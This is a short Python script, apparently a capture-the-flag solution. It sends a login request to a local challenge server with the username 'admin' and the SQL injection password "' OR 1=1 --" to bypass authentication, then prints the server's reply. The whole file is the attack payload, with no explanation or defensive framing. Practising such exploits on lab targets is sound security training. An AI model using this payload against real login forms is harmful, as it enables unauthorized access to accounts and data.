import requests
import json

URL = "http://challenge.localhost:80"

DATA = {"username" : "admin", "password" : "' OR 1=1 --"}

response = requests.post(url = URL, data = DATA);

print(response.content)
